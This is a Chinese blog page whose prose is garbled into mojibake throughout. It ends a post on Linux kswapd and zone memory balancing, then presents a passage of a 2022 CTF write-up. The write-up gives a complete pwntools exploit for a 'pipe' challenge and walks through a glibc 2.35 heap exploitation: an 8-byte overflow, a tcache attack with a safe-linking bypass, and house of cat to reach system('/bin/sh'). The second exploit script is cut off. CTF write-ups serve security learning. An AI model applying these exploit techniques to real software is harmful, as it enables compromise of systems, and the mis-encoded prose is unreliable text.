<p>Áª¥Êä§Á©∫Èó≤È°µÈù¢ÁöÑ‰ºô‰º¥Á≥ªÁªüÂíåÁª¥Êä§ÂèØÂõûÊî∂È°µÈù¢ÁöÑ LRU ÈÉΩÂ∑•‰ΩúÂú® zone Ëøô‰∏ÄÂ±ÇÔºåÊâÄ‰ª•ÂÖ∑‰ΩìÁöÑÂÜÖÂ≠òÂõûÊî∂Êìç‰Ωú‰πüÊòØÂú® zone Â±ÇËøõË°åÁöÑ</p>
<p>Kernel ‰∏≠ËøΩÊ±ÇÁöÑÂπ≥Ë°°Âπ∂‰∏çÈíàÂØπÂÖ®‰ΩìÂÜÖÂ≠òÔºåËÄåÊòØÈíàÂØπÊØè‰∏Ä‰∏™ NUMA ËäÇÁÇπÁöÑÂÜÖÂ≠òËÄåË®ÄÁöÑÔºö</p>
<ul>
<li>NUMA Á≥ªÁªü‰∏≠ÁöÑÊØè‰∏Ä‰∏™ËäÇÁÇπÈÉΩÊòØÂπ∂ÂàóÁöÑÔºåÁªü‰∏ÄËÄÉËôëÊï¥‰ΩìÁöÑÂπ≥Ë°°ÂÖ∂ÂÆûÊ≤°‰ªÄ‰πàÊÑè‰πâ</li>
<li>ÊâÄ‰ª•ÂØπÂ∫î‰∫éÁ≥ªÁªü‰∏≠ÁöÑÊØè‰∏™ NUMA ËäÇÁÇπÈÉΩ‰ºöÊúâ‰∏Ä‰∏™ kswapd Á∫øÁ®ãÊù•ËøõË°åÂπ≥Ë°°</li>
</ul>
<p>Âçï‰∏™ NUMA ËäÇÁÇπÁöÑÂÜÖÂ≠òÁöÑÂπ≥Ë°°Áî± <code>pgdat_balanced</code> ÂáΩÊï∞Êù•Âà§Êñ≠</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">pgdat_balanced</span><span class="params">(<span class="keyword">pg_data_t</span> *pgdat, <span class="keyword">int</span> order, <span class="keyword">int</span> classzone_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mark = <span class="number">-1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= classzone_idx; i++) &#123;</span><br><span class="line">		zone = pgdat-&gt;node_zones + i;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!managed_zone(zone))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		mark = high_wmark_pages(zone);</span><br><span class="line">		<span class="keyword">if</span> (zone_watermark_ok_safe(zone, order, mark, classzone_idx))</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mark == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂáΩÊï∞ <code>pgdat_balanced</code> ÈúÄË¶Å‰∏§‰∏™ÈáçË¶ÅÁöÑÊåáÊ†áÔºö<ul>
<li><code>classzone_idx</code>ÔºöÁî®‰∫éÁ°ÆÂÆö‰∏ÄÁßçÁ±ªÂûãÁöÑ zone</li>
<li><code>order</code>ÔºöÁî®‰∫éÁ°ÆÂÆö‰∏ÄÂØπ‰ºô‰º¥È°µÁöÑÂ§ßÂ∞è</li>
</ul>
</li>
</ul>
<p><code>classzone_idx</code>Ôºö</p>
<p>Âú® Kernel ‰∏≠Ôºå‰∏Ä‰∏™ NUMA ËäÇÁÇπÁöÑÂÜÖÂ≠òË¢´ÂàÜÊàêËã•Âπ≤‰∏™ zoneÔºàÂå∫ÂàÜ‰æùÊçÆ‰∏∫Á∞áÂà∞Â§ÑÁêÜÂô®ÁöÑ‚ÄúË∑ùÁ¶ª‚ÄùÔºâÔºå‰∏Ä‰∏™ zone Áî®‰∫éË°®Á§∫ÂÜÖÂ≠ò‰∏≠ÁöÑÊüê‰∏™ËåÉÂõ¥ÔºåÂú® Linux ‰∏≠Áî±‰∏ãÊ†á <code>classzone_idx</code> Êù•ËøõË°åÁ¥¢ÂºïÔºö</p>
<ul>
<li>Ëøô‰∫õ zone ‰∏ãÊ†áË∂äÂ§ßÔºåzone ÈáåÁöÑÂÜÖÂ≠ò‰ΩøÁî®ËåÉÂõ¥Â∞±Ë∂äÂ∞è</li>
<li>Â∞è‰∏ãÊ†á zone ÁöÑÂÜÖÂ≠òÁî®ÈÄîÊÄªÊòØÂåÖÂê´Â§ß‰∏ãÊ†á zone ÁöÑ</li>
<li>Âõ†Ê≠§Â§ß‰∏ãÊ†áÁöÑ zone ÊòæÂæóÊõ¥Âä†‚Äú‰∏çÈÄöÁî®‚Äù</li>
</ul>
<p>‰∫éÊòØÂú®ËøõË°åÂÜÖÂ≠òÂàÜÈÖçÁöÑÊó∂ÂÄôÔºåÊÄªÊòØ‰ºö‰ºòÂÖàÂ∞ùËØïÂú® <code>classzone_idx</code> ÊúÄÂ§ßÁöÑ zone ÈáåÈù¢ÁöÑÂéªÂàÜÈÖçÔºå‰∏çË°åÂÜçÂ∞ùËØï <code>classzone_idx</code> Êõ¥Â∞èÁöÑ zone</p>
<p><code>order</code>Ôºö</p>
<p>zone ÈáåÈù¢ÁöÑÂÜÖÂ≠òÊòØÁî®‰ºô‰º¥Á≥ªÁªüÊù•ÁÆ°ÁêÜÁöÑÔºå‰ºô‰º¥Á≥ªÁªüÈáåÈù¢ÊúâÂæàÂ§ö‰∏™ <code>freelist</code>ÔºåÂàÜÂà´ÊòØ 2^n ‰∏™ËøûÁª≠È°µÈù¢ÁöÑÁ©∫Èó≤ÈìæË°®</p>
<ul>
<li><code>order</code> Â∞±‰ª£Ë°®ËøôÈáåÁöÑ nÔºå<code>order</code> Ë∂äÂ§ßÔºåÊÑèÂë≥ÁùÄÈúÄË¶ÅË∂äÂ§öÁöÑËøûÁª≠È°µÈù¢</li>
<li>Â§ß <code>order</code> ÂØπÂ∞è <code>order</code> ‰πüÊòØÊúâÂåÖÂê´ÂÖ≥Á≥ªÁöÑ</li>
<li>Â§ß <code>order</code> ÁöÑËøûÁª≠ÂÜÖÂ≠òÂÖ∂ÂÆûÂπ∂‰∏çÊòØÈÇ£‰πàÂÆπÊòìÂ∞±ÂõûÊî∂Âà∞ÁöÑ</li>
</ul>
<p>‰∫éÊòØ‰ºô‰º¥Á≥ªÁªü‰ºöÂ∞ΩÈáèÈÅøÂÖçÂàÜË£ÇÂ§ß <code>order</code> ÁöÑËøûÁª≠ÂÜÖÂ≠òÔºåÁ¢éÁâáÂåñÁöÑÂ∞è <code>order</code> ÂÜÖÂ≠ò‰ºöÊàê‰∏∫‰ºòÂÖàÂàÜÈÖçÁöÑÁõÆÊ†á</p>
<p><strong>kswapd Á∫øÁ®ã</strong></p>
<p>kswapd ÊòØ Linux ‰∏≠Áî®‰∫éÈ°µÈù¢ÂõûÊî∂ÁöÑÂÜÖÊ†∏Á∫øÁ®ãÔºåÊã•ÊúâÂ¶Ç‰∏ãÁâπÊÄßÔºö</p>
<ul>
<li>kswapd Á∫øÁ®ãÊØè100ÊØ´ÁßíËµ∑Êù•Â∑•‰Ωú‰∏ÄÊ¨°ÔºåÊàñËÄÖÁî±‰∫éÂà´ÁöÑËøõÁ®ãÂàÜÈÖçÂÜÖÂ≠òÂ§±Ë¥•ÔºåËÄåË¢´Âî§ÈÜí</li>
<li>kswapd ÊØèÊ¨°Â∑•‰ΩúÈÉΩÊúâ‰∏Ä‰∏™ <code>order</code> Âíå <code>classzone_idx</code> ‰Ωú‰∏∫ÁõÆÊ†á</li>
<li>kswapd Â¶ÇÊûú‰∏ªÂä®Â∑•‰ΩúÔºå<code>order</code> ÊÄªÊòØ‚Äú0‚ÄùÔºå<code>classzone_idx</code> ÊÄªÊòØÊúÄÂ§ßÁöÑ zone </li>
</ul>
<p>ÂÖ∂ÂÆû kswapd ÁöÑ‰ªªÂä°Â∞±ÊòØËÆ©ÊØè‰∏Ä‰∏™ zone ÁöÑÁ©∫Èó≤ÂÜÖÂ≠òÈÉΩË∂ÖËøáÈ´òÊ∞¥‰ΩçÔºåËá≥‰∫éÈ°µÈù¢Âú®ÂêÑ‰∏™ order Èó¥ÁöÑÂπ≥Ë°°ÂàÜÂ∏ÉÂ∞±‰∏çÁî®ÁÆ°</p>
<p>ÂØπ‰∫é kswapd ÊãøÂà∞ÁöÑ <code>order</code>ÔºåÊâÄ‰ª•Â¶ÇÊûúËææ‰∏çÂà∞Âπ≥Ë°°ÂàÜÂ∏ÉÔºåÂ∞±ËøòÂæóÁªßÁª≠ÂõûÊî∂‰ª•ÂèäÂ∞ùËØïÂ∞è <code>order</code> ÂêëÂ§ß <code>order</code> ÁöÑÁªÑË£Ö</p>
<p>ÂèÇËÄÉÔºö<a target="_blank" rel="noopener" href="https://blog.csdn.net/prike/article/details/78905753">linux kswapdÊµÖÊûê</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/15/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%9D%AFCTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/15/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%9D%AFCTF2022/" class="post-title-link" itemprop="url">Ê∑±‰ø°ÊúçÊùØCTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-15 18:31:48 / Modified: 18:33:14" itemprop="dateCreated datePublished" datetime="2022-11-15T18:31:48+08:00">2022-11-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pipe: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=d5d6c196bf2c85c2c624a610ec541382acc30bb0, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64‰ΩçÔºådynamicallyÔºåÂÖ®ÂºÄ</li>
</ul>
<p><strong>ÊºèÊ¥ûÂàÜÊûê</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">  close(fd);</span><br><span class="line">  system(<span class="string">&quot;./ctf.sh&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂæÄ <code>&quot;./ctf.sh&quot;</code> ‰∏≠ÂÜô <code>cat flag</code> Â∞±ÂèØ‰ª•‰∫Ü</li>
</ul>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>ÂèØ‰ª•ÂÖàÊää <code>cat flag</code> ÂÜôÂÖ•ÁÆ°ÈÅìÔºåÁÑ∂ÂêéÊää <code>pipe_buffer</code> ‰∏≠ÁöÑÊï∞ÊçÆÂÜôÂÖ• <code>&quot;./ctf.sh&quot;</code></p>
<p>ÂÆåÊï¥ expÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pipe&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.159.33&#x27;</span>,<span class="string">&#x27;45715&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x16D7)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;cmd&gt;&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_from_pipe</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_pipe</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;read size&gt;\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input&gt;&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_file</span>(<span class="params">path</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**File path&gt;&quot;</span>,path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">path,size</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**File path&gt;&quot;</span>,path)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**size?&gt;&quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span>():</span></span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;file path&gt;&quot;</span>,<span class="string">&quot;./ctf.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;cat flag\n&quot;</span></span><br><span class="line">write_to_pipe(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">write()</span><br><span class="line">close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="manageheap"><a href="#manageheap" class="headerlink" title="manageheap"></a>manageheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3)</span> stable release version 2.35.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">manageheap: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.35</span><span class="number">-0u</span>buntu3_amd64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=b988b53575c5a8324331c1b492940f6098e71ace, stripped<span class="number">&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64‰ΩçÔºådynamicallyÔºåÂÖ®ÂºÄ</li>
</ul>
<p><strong>ÊºèÊ¥ûÂàÜÊûê</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num = LODWORD(chunk_list[index]-&gt;num);</span><br><span class="line"><span class="keyword">if</span> ( i &gt; num )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;chunk_list[index]-&gt;chunk_data[<span class="number">8</span> * i], id) )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;chunk_list[index]-&gt;chunk_data[<span class="number">8</span> * i], <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;change done.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂΩì <code>i==num</code> Êó∂ÔºåÊúâ8Â≠óËäÇÁöÑÊ∫¢Âá∫</li>
</ul>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>ÂÖàÂà©Áî®8Â≠óËäÇÁöÑÊ∫¢Âá∫Êù•‰øÆÊîπ chunk-&gt;sizeÔºåÈáäÊîæÂêéËé∑Âæó unsorted chunkÔºåÊé•‰∏ãÊù•ÊâßË°å‰∏ÄÊ¨°Áî≥ËØ∑Êìç‰ΩúÔºåÊ≥ÑÈú≤Âá∫ÈÅóÁïôÂú® chunk ‰∏≠ÁöÑ main_arena Âíå tcache-&gt;next</p>
<p>ÁÑ∂ÂêéÊâì tcache attackÔºåÊää <code>IO_list_all</code> ÂÜôÂÖ• tcachebin ‰∏≠ÔºåËøôÈáåÊúâ‰∏§‰∏™Ê≥®ÊÑèÁÇπÔºö</p>
<ul>
<li>libc-2.34 ÂèäÂÖ∂‰ª•‰∏äÁâàÊú¨‰ºöËÆæÁΩÆ key ÂÄºÔºåÂà©Áî®Â¶Ç‰∏ãÂÖ¨ÂºèÂ∞±ÂèØ‰ª•ÁªïËøáÔºö</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = heap_base // <span class="number">0x1000</span></span><br><span class="line">target = IO_list_all^key</span><br></pre></td></tr></table></figure>
<ul>
<li>Âä´ÊåÅÁõÆÊ†á tcachebin ‰πãÂâçÔºåÈúÄË¶ÅÂÖàÁúãÁúã tcache head-&gt;count ÁöÑÂÄºÂ§ü‰∏çÂ§üÁî≥ËØ∑Âà∞ <code>IO_list_all</code>ÔºàÂΩìÂØπÂ∫î count ‰∏∫‚Äú0‚ÄùÊó∂ÔºåÁ®ãÂ∫èÂ∞Ü‰∏ç‰ºöÁî≥ËØ∑ËØ• tcachebin ‰∏äÁöÑ free chunkÔºâÔºåÊØîËµõÊó∂Â∞±ËÄÉËôëÊºè‰∫ÜËøô‰∏™ÈóÆÈ¢òÔºåÂØºËá¥ <code>IO_list_all</code> Áî≥ËØ∑‰∏çÂá∫Êù•ÔºåÊµ™Ë¥π‰∫ÜÂæàÈïøÁöÑÊó∂Èó¥</li>
</ul>
<p>Âú®È´òÁâàÊú¨ libc ‰∏≠ÔºåÊúÄÁªàÂä´ÊåÅÊéßÂà∂ÊµÅÁöÑÊâãÊÆµÂ∞±ÈÇ£‰πàÂá†ÁßçÔºåÊØîËµõÊó∂Êàë‰ΩøÁî®‰∫Ü house of cat</p>
<p>Êé•‰∏ãÊù•Â∞±ÊòØÊ†áÂáÜÁöÑ house of cat ‰∫ÜÔºåIO ÊµÅÂèØ‰ª•Â¶Ç‰∏ã‰ª£Á†ÅËøõË°åËß¶ÂèëÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !read(<span class="number">0</span>, chunk_list[i]-&gt;chunk_data, <span class="number">8</span> * LODWORD(chunk_list[i]-&gt;num)) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;something error!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂΩìËæìÂÖ•ÁöÑ <code>chunk_list[i]-&gt;num</code> ‰∏∫‚Äú0‚ÄùÊó∂Ôºå<code>read</code> Â∞±‰ºöÊâßË°åÂ§±Ë¥•</li>
<li>ÁÑ∂ÂêéË∞ÉÁî® <code>exit</code> Ëß¶Âèë house of cat</li>
</ul>
<p>Áî±‰∫éÊú¨È¢òÁõÆÊ≤°ÊúâÊ≤ôÁõíÔºåÊàëÁöÑÁ¨¨‰∏ÄÂèçÂ∫îÊòØÁõ¥Êé•ÂÜô <code>one_gadget</code>ÔºåÂêéÊù•ÊâìËøúÁ®ãÊó∂ÁéØÂ¢É‰∏çÂØπÔºåÂè™ËÉΩÁî® <code>system(&quot;/bin/sh&quot;)</code></p>
<p>ÂΩìÊó∂‰∏çÁü•ÈÅìÊÄé‰πàÊéßÂà∂Á®ãÂ∫èÁöÑÂèÇÊï∞ÔºåÂπ∏Â•Ω house of cat Ëß¶ÂèëÂêéÁõ¥Êé•ÊâßË°å‰∫Ü <code>system(&quot;aaaaaaaa&quot;)</code>Ôºå‰∫éÊòØÊàëÊääÊâÄÊúâÁöÑ <code>&quot;aaaaaaaa&quot;</code> ÊõøÊç¢‰∏∫ <code>&quot;/bin/sh&quot;</code> ÁÑ∂ÂêéÂ∞± getshell ‰∫Ü</p>
<p>ÂÆåÊï¥ expÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span 